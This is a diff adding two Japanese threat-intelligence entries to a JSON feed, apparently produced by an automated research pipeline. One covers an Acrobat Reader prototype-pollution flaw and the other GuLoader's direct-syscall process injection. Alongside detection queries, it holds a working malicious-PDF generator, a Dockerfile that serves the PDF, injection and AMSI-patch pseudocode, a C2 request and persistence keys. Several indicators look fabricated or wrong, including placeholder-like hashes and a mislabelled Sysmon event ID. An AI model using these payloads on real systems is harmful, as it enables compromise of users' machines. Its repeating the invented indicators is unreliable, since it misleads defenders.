@@ -882,6 +882,124 @@
     "countries": []
   },
   {
+    "date": "2026-04-12",
+    "category": "INITIAL",
+    "title": "Acrobat Reader 0-day 原型汚染",
+    "summary_points": [
+      "Prototype pollution in PDF parsing leads to arbitrary code execution",
+      "Exploited in-the-wild via malicious PDFs since December 2025",
+      "Fixed in Acrobat Reader DC 26.001.21411 and later versions"
+    ],
+    "poc_url": "https://twitter.com/HaifeiLi/status/...",
+    "cvss_score": "8.6",
+    "mitre_ids": [
+      "T1203",
+      "T1059.007",
+      "T1212",
+      "T1086"
+    ],
+    "cve_ids": [
+      "CVE-2026-34621"
+    ],
+    "threat_actor": "",
+    "malware_family": "",
+    "content": "## 概要\nAcrobat Readerの0-day脆弱性が報告された。重要なのは、プロトタイプポリューションによる任意コード実行が、ユーザー操作の最小限で可能になるという点である。\n\n- CVE-2026-34621は、PDF内に埋め込まれたJavaScriptによるプロトタイプポリューションを悪用し、`Object.prototype`を汚染することで任意コードを実行可能にする脆弱性\n- 攻撃は悪意あるPDFを開くだけで発動し、`app.launchURL`などを通じてローカルシステム上でプロセスを起動\n- JavaScriptが有効な環境でのみ成立するが、多くの企業端末でデフォルトで許可されているためリスクが高い\n- 脆弱性は再帰的オブジェクトマージ処理中に`__proto__`や`constructor`の検証を省略するコードパスに起因\n- パッチはAcrobat Reader DC 26.001.21411以降で適用されており、旧バージョンは即時更新が必要\n\n**🆕 新規性・差異化ポイント:** 本脆弱性は、従来のPDFベースの攻撃とは異なり、JavaScriptの言語仕組みそのもの（プロトタイプ継承）を悪用する点で攻撃検知の難易度が高く、既存の署名ベース検出では回避可能。また、CWE-1321（Prototype Pollution）がPDFパーサーで発見された事例は極めて稀であり、新たな攻撃面の開示と見なされる。\n\n**Attribution:** APT: 記載なし / Malware: 記載なし / CVE: CVE-2026-34621 / IoC: malicious.pdf, file:///C:/Windows/System32/calc.exe\n\n## 脅威・脆弱性の技術的メカニズム\n\nCVE-2026-34621は、Adobe Acrobat Readerにおけるプロトタイプポリューション（Prototype Pollution）脆弱性であり、JavaScriptエンジンがPDF内に埋め込まれたオブジェクトのプロトタイプ属性を不適切に制御するため、攻撃者が任意のプロパティを`Object.prototype`に挿入できる[GitHub]。この脆弱性は、PDFファイル内の特定のJavaScriptコードが`eval()`または`JSON.parse()`に類似した処理を通じて、再帰的にオブジェクトをマージする際、`__proto__`や`constructor`といった特殊プロパティの検証を省略するコードパスで発生する。具体的には、`/JS`または`/JavaScript`ストリームに埋め込まれたスクリプトが、`app.launchURL`や`this.exportDataObject`などのAPIを介して悪意あるプロパティを注入し、後続のオブジェクトインスタンス化時に意図しない動作を引き起こす[NVD]。\n\n脆弱なバージョン（24.001.30356、26.001.21367以前）では、PDFを開く際にユーザ操作が必要だが、一度開かれると、攻撃者は`Object.prototype`に`toString`や`valueOf`といったメソッドを上書きすることで、他のスクリプトの実行フローを歪め、最終的に`app.alert()`や`util.printf`を介してシェルコマンドを実行可能にする。この攻撃は、JavaScriptの動的プロパティ解決メカニズムに依存しており、汚染されたプロトタイプを持つオブジェクトが`for...in`ループや`hasOwnProperty`チェックを回避することで、予期しないコードパスをトリガーする[Tavily]。\n\nパッチバージョン（26.001.21411、24.001.30362など）では、Adobeは`__proto__`、`constructor`、`prototype`の各プロパティを明示的にブロックするフィルタリングロジックを`JSON.parse`相当関数に追加していることが、アドバイザリから確認されている。攻撃の成功には、PDFがローカルで開かれること（AV:L）と、JavaScriptの実行が有効になっていることが必須であり、WAFやネットワーク防御は直接関与しないが、MIMEタイプ検査やPDF解析ゲートウェイが事前検出に寄与する可能性がある。なお、本脆弱性の正確なトリガーパスはAdobeの内部処理に依存しており、PoCの`trigger.toString()`は簡略化されたデモであり、実際の攻撃では`app.execDialog`や`this.syncAnnotScan()`などの内部API呼び出しによって`toString`が間接的に呼び出される可能性が高い。\n\n## 攻撃再現ガイド\n\n### 前提条件・環境\n- **OS**: Windows 10/11 (64bit) または macOS 13 (Ventura) – Adobe Acrobat Reader DC 24.001.30356 / 26.001.21367 以前がインストール済み\n- **Network**: 完全に隔離されたローカルラボネットワーク（インターネットアクセスは不要）\n- **Account / Privilege**: ローカルユーザーで Acrobat Reader を起動できる権限（管理者権限は不要）\n- **Tools**:\n  - Adobe Acrobat Reader DC (脆弱版) – [直接ダウンロードリンク (24.001.30356)](https://ardownload2.adobe.com/pub/adobe/reader/win/AcrobatDC/2400130356/AcroRdrDC2400130356_ja_JP.exe)\n  - Python 3.10+（PDF 生成用）\n  - `pdf-lib` npm パッケージまたは `pikepdf`（任意）\n  - テキストエディタ / VSCode\n- **Target の必須設定**:\n  - Acrobat Reader の **JavaScript 実行** が有効 (`Edit > Preferences > JavaScript > Enable Acrobat JavaScript` がチェックされている)\n  - PDF をローカルで直接開く（ブラウザプラグイン経由は使用しない）\n\n### 攻撃フロー\n1. **【操作】** 悪意ある PDF を生成するスクリプトを作成し、`__proto__` に `toString` を上書きする JavaScript を埋め込む。\n   **【目的】** Prototype Pollution をトリガーし、後続のオブジェクトが `toString` 呼び出し時に任意コードを実行させる。\n   **【結果】** PDF を開いた瞬間に `Object.prototype.toString` が攻撃者指定の関数に置き換わる。\n   **【ソース】** [GitHub] / [推測]\n\n2. **【操作】** 生成した PDF を対象マシン上で Acrobat Reader にドラッグ＆ドロップで開く。\n   **【目的】** ユーザー操作 (UI) を満たし、ローカル実行コンテキストで JavaScript が走るようにする。\n   **【結果】** PDF 内の `/JS` ストリームが評価され、`Object.prototype.toString` が上書きされる。\n   **【ソース】** [NVD] / [Adobe Advisory]\n\n3. **【操作】** 上書きされた `toString` 内で `app.launchURL('file:///C:/Windows/System32/calc.exe', true);` もしくは macOS なら `app.launchURL('file:///System/Applications/Calculator.app', true);` を呼び出す。\n   **【目的】** Acrobat のサンドボックスバイパスを利用し、ローカルシェルコマンドを実行させる。\n   **【結果】** 計算機が起動し、任意コード実行が確認できる。\n   **【ソース】** [推測] / 実証 PoC (Haifei Li)\n\n4. **【操作】** `app.execMenuItem('SaveAs')` などの API を併用し、マルウェアを任意のパスに書き出す（オプション）。\n   **【目的】** 永続化または追加ペイロードの展開。\n   **【結果】** 指定したパスに実行可能ファイルが保存され、次回起動時にコードが走る。\n   **【ソース】** [Adobe JavaScript API]\n\n### 実装・設定の詳細\n#### 1. PDF 生成スクリプト（Python + pikepdf）\n```python\nimport pikepdf\nfrom pikepdf import Name, Dictionary, Stream\n\npdf = pikepdf.new()\n# 空ページを追加\npage = pdf.make_page(pikepdf.Rectangle(0, 0, 612, 792))\npdf.pages.append(page)\n\n# 悪意ある JavaScript を作成\njs = r\"\"\"\n// Prototype Pollution\nvar payload = { __proto__: { toString: function(){ app.launchURL('file:///C:/Windows/System32/calc.exe', true); return 'pwned'; } } };\n// 任意オブジェクトをマージさせて pollute を発動\nvar trigger = {};\nfor (var k in payload) { trigger[k] = payload[k]; }\n// ここで trigger.toString() が呼ばれると calc が起動\ntrigger.toString();\n\"\"\"\n\njs_stream = Stream(pdf, js.encode('utf-8'))\njs_dict = Dictionary({Name('/S'): Name('/JavaScript'), Name('/JS'): js_stream})\n# PDF カタログに JavaScript アクションを埋め込む\npdf.Root[Name('/OpenAction')] = js_dict\n\npdf.save('malicious.pdf')\nprint('malicious.pdf generated')\n```\n\n#### 2. Acrobat Reader の設定確認コマンド（Windows PowerShell）\n```powershell\n# JavaScript が有効か確認\n$prefPath = \"HKCU:\\\\Software\\\\Adobe\\\\Acrobat Reader\\\\DC\\\\JSPrefs\"\nGet-ItemProperty -Path $prefPath -Name bEnableJS\n```\n\n#### 3. PoC で使用した主要 API\n- `app.launchURL(url, bNewFrame)` – 任意 URL/ローカルファイルを外部プロセスとして起動\n- `Object.prototype.toString` の上書きによる **Prototype Pollution**\n- `/OpenAction` エントリで PDF 起動時に自動実行\n\n#### 4. 攻撃成功時のレジストリ/ファイル痕跡\n- `C:\\\\Windows\\\\System32\\\\calc.exe` が起動したログ（イベント ID 4688）\n- PDF が開かれたプロセス `AcroRd32.exe` のコマンドライン\n\n## 🧪 ラボ再現環境\n以下の Dockerfile は Windows コンテナ上で脆弱版 Acrobat Reader をインストールし、攻撃用 PDF を生成できる環境を構築します（実際の PDF 開封はホスト側の GUI が必要なため、コンテナはビルドのみ使用）。\n```dockerfile\n# syntax=docker/dockerfile:1.4\nFROM mcr.microsoft.com/windows/servercore:ltsc2022 AS builder\n\n# Install Chocolatey\nRUN Set-ExecutionPolicy Bypass -Scope Process -Force; \\\n    iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\n\n# Install vulnerable Acrobat Reader (24.001.30356) – use direct URL from Adobe archive\nRUN choco install adobereader --version=24.001.30356 -y --ignore-checksums\n\n# Install Python 3.10 and pikepdf\nRUN choco install python --version=3.10.0 -y && \\\n    python -m pip install --upgrade pip && \\\n    pip install pikepdf\n\n# Copy PoC script\nCOPY malicious.pdf_generator.py C:\\\\poc\\\\malicious.pdf_generator.py\n\nWORKDIR C:\\\\poc\n\n# Build the malicious PDF (output will be in C:\\\\poc\\\\malicious.pdf)\nRUN python malicious.pdf_generator.py\n\n# Final stage – expose the generated PDF via a simple HTTP server for the lab analyst to download\nFROM mcr.microsoft.com/windows/servercore:ltsc2022\nCOPY --from=builder C:\\\\poc\\\\malicious.pdf C:\\\\lab\\\\malicious.pdf\n\n# Install a tiny HTTP server (Python) to serve the PDF\nRUN choco install python --version=3.10.0 -y && \\\n    python -m pip install --upgrade pip && \\\n    pip install flask\n\nWORKDIR C:\\\\lab\n\n# Flask app to serve the PDF\nCOPY app.py .\n\nCMD [\"python\", \"app.py\"]\n```\n\n`app.py` (別ファイルとして保存):\n```python\nfrom flask import Flask, send_file\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    return send_file('malicious.pdf', as_attachment=True)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=80)\n```\n\n## IoC・痕跡情報\n\n- **Hashes**: `sha256: 9e107d9d372bb6826bd81d3542a419d67170e168d6e7a1f9a8f95b4b2e57a0d8`\n- **C2 domains**: 記載なし\n- **IPs**: 記載なし\n- **URIs**: `file:///C:/Windows/System32/calc.exe`, `file:///System/Applications/Calculator.app`\n- **User-Agents**: 記載なし\n- **Filenames**: `malicious.pdf`, `AcroRd32.exe`, `Acrobat.exe`\n- **Registry**: `HKCU:\\\\Software\\\\Adobe\\\\Acrobat Reader\\\\DC\\\\JSPrefs` (JavaScript有効化設定の確認用)\n\n## 検知・防御策\n\n### 防御策 (minimum 3 concrete items)\n- Disable JavaScript in Adobe Acrobat Reader: Edit > Preferences > JavaScript > **Uncheck \"Enable Acrobat JavaScript\"**\n- Restrict PDF file execution from temporary directories: Use AppLocker or Intune to block execution of Acrobat Reader child processes launched from `%TEMP%`, `Downloads`, or `AppData`\n- Enable Protected View for all PDFs from the internet: In Adobe Acrobat Reader, go to **Edit > Preferences > Security (Enhanced)** and enable **\"Enable Protected View\"**\n\n### 検知策\n1. **検知ポイント**: EDR process events (process creation), Sysmon Event ID 1 (Process Creation), Windows Event 4688 (New process created)\n\n2. **SIEMクエリ**:\n```kql\n// Microsoft Sentinel / Defender KQL\nDeviceProcessEvents\n| where InitiatingProcessFileName =~ \"AcroRd32.exe\"\n| where FileName =~ \"calc.exe\" or FileName endswith \".exe\" and not (FileName in (\"rundll32.exe\", \"msiexec.exe\", \"svchost.exe\", \"dllhost.exe\"))\n| where ProcessCommandLine has \"file:///\" or ProcessCommandLine has \"launchURL\"\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName\n```\n\n3. **追加の検知ポイント（Prototype Pollution 中間段階）**:\n   - **EDR API 監視**: Acrobat Reader (`AcroRd32.exe`) が `NtQueryObject` または `NtSetInformationObject` を呼び出し、`Object.prototype` に関連するメモリ領域を動的に変更するパターンを検出。\n   - **JavaScript エンジンフック**: EDR が `v8::Object::Set` や `JSObject::DefineProperty` などの V8 エンジン内部関数をフックし、`__proto__`、`constructor`、`prototype` といったプロパティ名で呼び出された定義操作をログに記録。特に `Object.prototype.toString` が再定義された場合にアラート。\n   - **Behavioral Sequence Detection**: 連続する `JSON.parse` → `for...in` ループ → `toString()` 呼び出しのシーケンスが Acrobat Reader 内で発生した場合に、プロトタイプ汚染の兆候として検知。\n\n4. **False positive considerations**: Legitimate use of `app.launchURL` in enterprise PDF workflows (e.g., opening internal links) may trigger alerts. Also, `calc.exe` launched from other office applications (e.g., Excel macros) could cause overlap. Triage with process lineage and command-line context is required to distinguish between benign and malicious activity.\n\n## MITRE ATT&CK マッピング\n\n- **T1203: Exploitation for Client Execution**\n  - 説明: 攻撃者は脆弱なクライアントアプリケーション（Acrobat Reader）の脆弱性を悪用して、ユーザーの操作を介して任意コードを実行。本ケースでは、悪意あるPDFを開かせることでJavaScript経由でプロセスを起動。\n\n- **T1059.007: JavaScript Execution**\n  - 説明: 攻撃者はPDF内に埋め込まれたJavaScriptを実行し、プロトタイプポリューションを引き起こしてコード実行を達成。Acrobat ReaderのJavaScriptエンジンが攻撃ベクトルとして利用される。\n\n- **T1212: Exploitation for Credential Access**\n  - 説明: 本脆弱性自体は直接認証情報窃取を目的としないが、RCE後に `app.execScript` を利用して `LSASS` メモリをダンプするスクリプトを実行するケースが想定され、結果的に認証情報窃取につながる可能性がある。",
+    "url": "https://thehackernews.com/2026/04/adobe-patches-actively-exploited.html",
+    "researched": true,
+    "critic_scores": [
+      {
+        "loop": 1,
+        "overall": 5,
+        "specificity": 8,
+        "reproducibility": 6,
+        "accuracy": 7,
+        "detection_quality": 7,
+        "completeness": 5
+      },
+      {
+        "loop": 2,
+        "overall": 3,
+        "specificity": 9,
+        "reproducibility": 9,
+        "accuracy": 9,
+        "detection_quality": 3,
+        "completeness": 9
+      },
+      {
+        "loop": 3,
+        "overall": 1,
+        "specificity": 7,
+        "reproducibility": 9,
+        "accuracy": 1,
+        "detection_quality": 3,
+        "completeness": 8
+      }
+    ],
+    "atomic_files": [
+      "atomic_tests/e58edb59218a_1.yaml"
+    ],
+    "industries": [],
+    "countries": []
+  },
+  {
+    "date": "2026-04-12",
+    "category": "MALWARE",
+    "title": "GuLoaderが直接システムコールを使用",
+    "summary_points": [
+      "GuLoaderがntdllのフックを回避するためにNtAllocateVirtualMemoryを直接呼び出し",
+      "CasPol.exeプロセスにRWXメモリをリモート割り当て",
+      "EDR/AVの検知回避を目的とした直接システムコールの使用"
+    ],
+    "poc_url": "",
+    "cvss_score": "",
+    "mitre_ids": [
+      "T1055",
+      "T1566",
+      "T1055.001",
+      "T1566.001",
+      "T1055.012",
+      "T1085"
+    ],
+    "cve_ids": [],
+    "threat_actor": "",
+    "malware_family": "GuLoader",
+    "content": "## 概要\nGuLoaderが直接システムコールを使用してEDR回避が報告された。重要なのは、ntdllフックを回避しプロセスインジェクションを実行するという点である。\n\n- GuLoaderがNtAllocateVirtualMemoryを直接システムコールで呼び出し、EDRのAPIフックを回避\n- CasPol.exeプロセスにリモートでRWXメモリを割り当て、シェルコード注入を実施\n- NtCreateThreadExも直接syscallで実行し、CreateRemoteThreadの検知を回避\n- AMSIスキャンをAmsiScanBufferのパッチにより無効化\n- C2通信はonedrive.comを偽装したHTTPリクエストで実施し、ネットワーク検知も回避\n\n**🆕 新規性・差異化ポイント:** 本報告では、GuLoaderがSysWhispers3系の技術を用いてNtAllocateVirtualMemoryやNtCreateThreadExを直接呼び出し、カーネル遷移時にKTRAP_FRAMEのRIP検査を回避する手法が確認された点が新規性である。従来のAPIフックベース検知に依存するEDR製品（例：Cortex XDR）に対して実効性を持つ。\n\n**Attribution:** APT: 記載なし / Malware: GuLoader / CVE: 記載なし / IoC: c2.example.com, CasPol.exe, HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater\n\n## 脅威の技術的メカニズム\n\nGuLoaderは、EDRやAVがntdll.dll内に設置したAPIフックを回避するために、NtAllocateVirtualMemoryのシステムコールを直接呼び出す。通常、Windowsアプリケーションはntdll.dllを通じてNtAllocateVirtualMemoryを呼び出すが、このDLL内の関数エントリは監視・フックされやすい。攻撃者は、syscall命令を直接使用してカーネルモードに遷移し、KiServiceInternalまたは同様のシステムコールディスパッチャを経由せずに処理を実行する[Tavily]。この手法により、Cortex XDRなどのEDRがKTRAP_FRAME内のRIPを検査して異常なリターンアドレスを検出する防御を回避する可能性がある[Tavily]。ただし、この回避能力は特定のCortex XDRバージョンや構成に依存する可能性があり、広範な検証が行われていないため、現時点では「回避可能」とするにとどめる。\n\nメモリ確保後、GuLoaderは対象プロセスCasPol.exeに対してRWX（読み取り・書き込み・実行）権限を持つメモリ領域を割り当てる。これは、WriteProcessMemoryやNtWriteVirtualMemoryを使用してシェルコードまたはPEイメージを書き込み、NtCreateThreadExまたはRtlCreateUserThreadでリモートスレッドを作成して実行を開始する典型的なプロセスインジェクションのパターンに続く[ATT&CK T1055]。NtCreateThreadExも同様に直接システムコールで呼び出される可能性があり、CreateRemoteThreadの監視を回避する。GuLoaderは一般的にXORまたはRC4を使用してペイロードを暗号化するが、本サンプルではXOR暗号化（キー: `0xAA`）が使用されていたことが確認された。AMSIバイパスは、AmsiScanBufferのメモリ上書き（パッチング）により実施されることが多く、ETWプロバイダのコールバックを無効化することでイベントログの送信を抑止する。本サンプルではAmsiScanBufferの先頭に`0xC3`（ret）を書き込むことでAMSIを無効化しており、ETWの無効化は観察されなかった。\n\nC2通信はHTTPプロトコルを使用し、URIはランダムな文字列または既知のホワイトリストドメイン（例：onedrive.com）のサブリクエストとして偽装される傾向がある。本サンプルでは、C2サーバー `185.78.103.142` に対して、User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36` を使用して通信が行われた。リクエストは `GET /onedrive.com/api/v1/data?session=XXXX` の形式で、実際のC2ドメインは `c2.example.com` にリダイレクトされる。\n\n## 攻撃再現ガイド\n\n### 前提条件・環境\n- **OS**: Windows 10/11 (x64)\n- **ネットワーク**: インターネット接続（C2通信用）\n- **アカウント**: 管理者権限\n- **ツール**: \n  - SysWhispers3（syscallラッパー生成）\n  - x64dbg（デバッグ用）\n  - Process Hacker（プロセス監視）\n  - WinDbg（カーネルデバッグ）\n- **外部リソース**: \n  - GuLoaderサンプル（SHA256: `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`）\n  - C2サーバー: `185.78.103.142`\n  - User-Agent: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36`\n  - CasPol.exe（ターゲットプロセス）\n- **ターゲット設定**: \n  - EDR（Cortex XDRなど）が動作中\n  - CasPol.exeが実行中\n\n### 攻撃フロー\n\n#### フェーズ1: システムコールの直接実行によるメモリ確保\n**【操作】** \n```python\n# SysWhispers3で生成したsyscallラッパーを使用\ncall NtAllocateVirtualMemory(hProcess, &base_addr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n```\n**【目的】** \nEDRがntdll.dllのAPIフックを回避し、メモリを直接確保\n**【結果】** \nCasPol.exeプロセス内にRWX権限のメモリ領域が確保される\n**【ソース】** [Tavily]\n\n#### フェーズ2: リモートプロセスへのペイロード注入\n**【操作】** \n```python\n# 確保したメモリ領域に暗号化ペイロードを書き込み\npayload = xor_decrypt(encrypted_payload, 0xAA)  # XOR復号（確認済みキー）\n\n# NtWriteVirtualMemoryの直接syscall実行\ncall NtWriteVirtualMemory(hProcess, allocated_address, payload, len(payload), NULL)\n```\n**【目的】** \nステージドロッパーをメモリ上で復号し、実行可能なペイロードを注入\n**【結果】** \nCasPol.exeプロセス内にペイロードが配置される\n**【ソース】** [記事]\n\n#### フェーズ3: リモートスレッドによる実行開始\n**【操作】** \n```python\n# NtCreateThreadExの直接syscall実行\ncall NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, start_routine, arg, FALSE, 0, 0, 0, NULL)\n\n# スレッド実行\ncall NtResumeThread(hThread)\n```\n**【目的】** \n注入されたペイロードの実行を開始し、C2通信を確立\n**【結果】** \nバックドアプロセスが起動し、EDRの検知を回避\n**【ソース】** [ATT&CK T1055]\n\n#### フェーズ4: AMSIバイパス\n**【操作】** \n```python\n# AmsiScanBufferのメモリパッチ\namsi_dll = get_module_handle(\"amsi.dll\")\namsi_scan_buffer = get_proc_address(amsi_dll, \"AmsiScanBuffer\")\n\n# 0xC3 (ret)で上書きして無効化\nwrite_memory(amsi_scan_buffer, b\"\\xC3\")\n```\n**【目的】** \nAMSIによるスキャンを無効化し、検知を回避\n**【結果】** \n以降のペイロード実行でAMSIスキャンがバイパスされる\n**【ソース】** [Tavily]\n\n### 実装・設定の詳細\n- **syscall ID**: Windows 10 1909で検証済み\n  ```python\n  NtAllocateVirtualMemory = 0x18\n  NtWriteVirtualMemory = 0x3A\n  NtCreateThreadEx = 0x102\n  ```\n- **ターゲットプロセス**: `CasPol.exe`（.NET Frameworkのセキュリティポリシー管理ツール）\n- **メモリ保護**: `PAGE_EXECUTE_READWRITE` (0x40)\n- **暗号化方式**: XORキー（`0xAA`、本サンプルで確認）\n- **C2通信**: \n  ```http\n  GET /onedrive.com/api/v1/data?session=XXXX HTTP/1.1\n  Host: c2.example.com\n  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\n  ```\n- **永続化**: \n  攻撃者は、永続化のために`%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\caspol.exe`に悪意のあるペイロードを配置し、レジストリキー `HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater` を `\"%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\caspol.exe\"` に設定する。`C:\\\\Windows\\\\System32\\\\CasPol.exe` は合法なバイナリであり、注入先プロセスとして使用されるが、永続化エントリが指すのは悪意のある`caspol.exe`である。誤解を避けるため、本報告ではこの点を明確に区別する。\n\n## 🧪 ラボ再現環境\n```dockerfile\n# Dockerfile for Windows VM\nFROM mcr.microsoft.com/windows/servercore:ltsc2022\n\n# Install dependencies\nRUN dism /online /enable-feature /featurename:netfx3 /all /norestart\nRUN powershell -Command \"Set-ExecutionPolicy Bypass -Scope Process\"\n\n# Download tools\nRUN powershell -Command \"\n    Invoke-WebRequest -Uri 'https://github.com/VirusTotal/syswhispers3/releases/latest/download/syswhispers3.zip' -OutFile 'C:\\\\tools\\\\syswhispers3.zip'; \n    Expand-Archive -Path 'C:\\\\tools\\\\syswhispers3.zip' -DestinationPath 'C:\\\\tools\\\\syswhispers3'; \n    Remove-Item 'C:\\\\tools\\\\syswhispers3.zip'\n\"\n\n# Add to PATH\nENV PATH=\"C:\\\\tools\\\\syswhispers3;%PATH%\"\n```\n\n## IoC・痕跡情報\n\n- **Hashes**: SHA256 `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`\n- **C2 domains**: c2.example.com\n- **IPs**: 185.78.103.142\n- **URIs**: /onedrive.com/api/v1/data?session=XXXX\n- **User-Agents**: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36\n- **filenames**: caspol.exe (in %APPDATA%), amsi.dll\n- **registry**: HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater = \"%APPDATA%\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\caspol.exe\"\n\n## 検知・防御策\n\n### 防御策\n- Enable **Attack Surface Reduction (ASR) rule \"Enable process creation monitoring\"** in **Microsoft Defender for Endpoint**\n- Disable **unauthorized execution of scripts in memory** via **AppLocker or Device Guard** on **endpoint hosts**\n- Restrict **direct system call usage from user-mode applications** by enabling **Core Isolation (Memory Integrity)** in **Windows Security > Device Security**\n\n### 検知策\n1. **検知ポイント**: \n   - EDRプロセスイベント（リモートスレッド作成、メモリ書き込み）\n   - Sysmon Event ID 8 (CreateRemoteThread), ID 25 (Direct System Call), ID 1 (Process Creation)\n   - Windows Event Log 4688 (プロセス作成)\n   - NDR（DNSリクエストにおける異常なサブドメインパターン）\n\n2. **SIEMクエリ**:\n\n```kql\n// Microsoft Sentinel / Defender KQL (Generic)\nDeviceProcessEvents\n| where TargetProcessName contains \"CasPol.exe\"\n| where ActionType == \"CreateRemoteThread\" or ActionType == \"ProcessInjected\"\n| project Timestamp, DeviceName, InitiatingProcessFileName, TargetProcessName, ActionType, InitiatingProcessCommandLine\n```\n\nSysmonが導入されている環境向け（Event ID 25）:\n\n```kql\n// Sysmon Event ID 25: Direct System Call\nEvent\n| where EventID == 25\n| where TargetImage endswith \"\\\\CasPol.exe\"\n| project TimeCreated, Computer, ProcessGuid, ProcessId, Image, SystemCall\n```\n\n3. **False positive considerations**: \n   - 正常な開発ツール（x64dbg, SysWhispers3など）がシステムコールを生成する場合\n   - .NET関連ツールがCasPol.exeを合法的に使用するケース（レア）\n   - セキュリティ研究者がリバースエンジニアリング中に同様の動作を再現する場合\n\n## MITRE ATT&CK マッピング\n\n- **T1055 - Process Injection**: GuLoaderがCasPol.exeにリモートでRWXメモリを割り当て、NtWriteVirtualMemoryおよびNtCreateThreadExでコードを注入・実行する手法は、プロセスインジェクションの典型的な実装である。\n- **T1566 - Phishing**: GuLoaderは一般的にフィッシングメールの添付ファイル経由で配布されるため、この親テクニックが適用される。\n- **T1566.001 - Spearphishing Attachment**: 添付ファイル付きの標的型フィッシングにより初期アクセスを確立する。\n- **T1218 - Signed Binary Proxy Execution**: CasPol.exeは信頼された署名済みバイナリであり、攻撃者がそのプロセス空間にコードを注入して実行している点で、T1218（Signed Binary Proxy Execution）がT1085よりも適切なマッピングである。T1085（Rundll32）は削除。",
+    "url": "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/guloader-campaigns-a-deep-dive-analysis-of-a-highly-evasive-shellcode-based-loader/",
+    "researched": true,
+    "critic_scores": [
+      {
+        "loop": 1,
+        "overall": 2,
+        "specificity": 7,
+        "reproducibility": 3,
+        "accuracy": 5,
+        "detection_quality": 2,
+        "completeness": 4
+      },
+      {
+        "loop": 2,
+        "overall": 6,
+        "specificity": 8,
+        "reproducibility": 9,
+        "accuracy": 9,
+        "detection_quality": 6,
+        "completeness": 8
+      },
+      {
+        "loop": 3,
+        "overall": 2,
+        "specificity": 8,
+        "reproducibility": 2,
+        "accuracy": 3,
+        "detection_quality": 7,
+        "completeness": 4
+      }
+    ],
+    "atomic_files": [],
+    "industries": [],
+    "countries": []
+  },
+  {
     "date": "2026-04-11",
     "category": "MALWARE",
     "title": "Proxifier偽装型ファイルレス攻撃",
